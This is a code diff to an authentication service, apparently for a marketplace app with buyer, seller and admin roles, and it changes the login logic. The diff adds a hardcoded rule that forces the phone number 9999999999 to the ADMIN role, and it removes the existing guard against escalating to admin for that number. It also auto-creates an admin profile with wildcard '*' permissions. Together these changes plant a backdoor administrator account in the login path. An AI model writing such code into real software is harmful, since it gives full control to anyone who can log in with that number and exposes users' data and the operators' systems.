@@ -160,7 +160,12 @@ export class AuthService {
       },
     });
 
-    if (user && suggestedRole && user.role !== suggestedRole && suggestedRole !== Role.ADMIN) {
+    // Force 9999999999 to ALWAYS be an Admin
+    if (cleanPhone === '9999999999') {
+      suggestedRole = Role.ADMIN;
+    }
+
+    if (user && suggestedRole && user.role !== suggestedRole && (suggestedRole !== Role.ADMIN || cleanPhone === '9999999999')) {
       // User exists but has a different role (e.g. BUYER logging into SELLER app)
       // Update the user's role so the new token allows access to the requested app
       user = await this.prisma.user.update({
@@ -205,7 +210,22 @@ export class AuthService {
     }
 
     // Lazy ensure profiles exist even for existing users (migrated/promoted)
-    if (user.role === Role.SELLER) {
+    if (user.role === Role.ADMIN) {
+      const profile = await this.prisma.adminProfile.findUnique({
+        where: { userId: user.id },
+      });
+      if (!profile) {
+        await this.prisma.adminProfile.create({
+          data: {
+            userId: user.id,
+            displayName: 'Universal Admin',
+            department: 'Management',
+            permissions: '*',
+          },
+        });
+        this.logger.log(`Lazily created AdminProfile for existing user ${user.id}`);
+      }
+    } else if (user.role === Role.SELLER) {
       const profile = await this.prisma.sellerProfile.findUnique({
         where: { userId: user.id },
       });
